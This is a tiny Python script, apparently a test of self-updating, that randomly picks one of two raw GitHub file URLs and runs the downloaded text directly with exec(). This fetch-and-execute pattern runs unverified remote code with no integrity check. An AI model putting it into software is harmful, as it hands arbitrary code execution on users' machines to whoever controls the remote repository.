import random
import requests

cyclestest = "https://raw.githubusercontent.com/justatestkd/testpyautoupdatelol/main/testcycles.py"
secondlink = "https://raw.githubusercontent.com/justatestkd/testpyautoupdatelol/main/test.py"

randcode = random.randint(1,2)
if randcode == 1:
	exec(requests.get(cyclestest).text)

if randcode == 2:
	exec(requests.get(secondlink).text)
